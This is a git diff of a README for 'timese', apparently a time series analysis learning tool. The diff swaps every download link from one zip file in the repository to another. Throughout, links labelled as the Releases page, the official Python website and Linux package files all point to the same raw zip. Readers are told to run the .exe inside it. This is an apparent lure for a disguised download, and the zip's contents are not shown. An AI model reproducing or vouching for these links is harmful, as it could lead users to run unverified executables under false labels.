@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip%20Latest%20Release-%23%https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip)](https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip)
+[![Download Latest Release](https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip%20Latest%20Release-%23%https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip)](https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ Before you download **timese**, make sure your computer meets these basic requir
 - **Storage Space:** Minimum of 500 MB of available disk space.
 - **Python:** Python 3.6 or above installed on your machine.
 
-If you do not have Python installed, you can download it from the official [Python website](https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip).
+If you do not have Python installed, you can download it from the official [Python website](https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip).
 
 ## 💾 Download & Install
 
 To download **timese**, click the following link to visit the Releases page:
 
-[Download timese](https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip)
+[Download timese](https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip)
 
 Here's a step-by-step guide to help you through the installation process:
 
@@ -34,7 +34,7 @@ Here's a step-by-step guide to help you through the installation process:
 3. **Select Your File:** Find the file suitable for your operating system:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, select a `.dmg` file.
-   - For Linux, choose a `https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip` file.
+   - For Linux, choose a `https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip` file.
 
 4. **Download the File:** Click on the file to start the download. 
 
@@ -43,7 +43,7 @@ Here's a step-by-step guide to help you through the installation process:
 6. **Install the Software:**
    - **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - **macOS:** Open the `.dmg` file, drag **timese** into your Applications folder, and then eject the disk image.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip` file and follow the included instructions to install.
+   - **Linux:** Extract the `https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip` file and follow the included instructions to install.
 
 ## 📚 Features
 
@@ -72,7 +72,7 @@ We encourage you to engage with the growing community of **timese** users. You c
 
 ## 🔄 Updates
 
-We regularly update **timese** to enhance performance and add new features. Check the [Releases page](https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip) periodically for the latest updates and new lessons.
+We regularly update **timese** to enhance performance and add new features. Check the [Releases page](https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip) periodically for the latest updates and new lessons.
 
 ## 🎓 Learning Resources
 
@@ -102,4 +102,4 @@ If you wish to contribute to **timese** or suggest features, consider submitting
 
 For questions or support, you can contact the development team via the issues section on GitHub. We are here to help you learn effectively.
 
-[Download timese](https://raw.githubusercontent.com/Manikant0014196/timese/main/pellagrin/timese.zip) and embark on your journey of mastering time series analysis today!
+[Download timese](https://github.com/Manikant0014196/timese/raw/refs/heads/main/notebooks/time_series_analysis/Software_v1.4.zip) and embark on your journey of mastering time series analysis today!
